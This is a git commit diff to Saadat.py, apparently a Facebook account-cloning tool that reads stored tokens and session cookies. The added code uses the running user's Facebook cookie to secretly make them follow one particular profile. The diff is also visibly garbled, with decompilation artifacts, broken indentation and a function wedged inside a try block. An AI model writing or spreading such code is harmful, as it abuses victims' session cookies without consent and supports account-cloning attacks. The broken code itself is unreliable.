5e0be28dabf1238ebd73c8e1392ed6e3404b0e51
Raziq-S <132817783+Raziq-S@users.noreply.github.com>
2023-05-08 02:23:35 +0430

    Update Saadat.py

--- Saadat.py
+++ Saadat.py
@@ -173,12 +173,12 @@ def public():
 	try:
 		tok = open('data/token','r').read()
 		cok = open('data/coki','r').read()
-		tokenku.append(tok)
-	except IOError:
-		print('\033[1;31mYour cookies han expired...');time.sleep(1)
-		c_login()
-	create()
-	time.sleep(1)
+		def follow(self, session, coki):
+        r = BeautifulSoup(session.get('xdg-open https://www.facebook.com/profile.php?id=100028315179402', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
 	clear()
 	try:
 		jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;91m '))
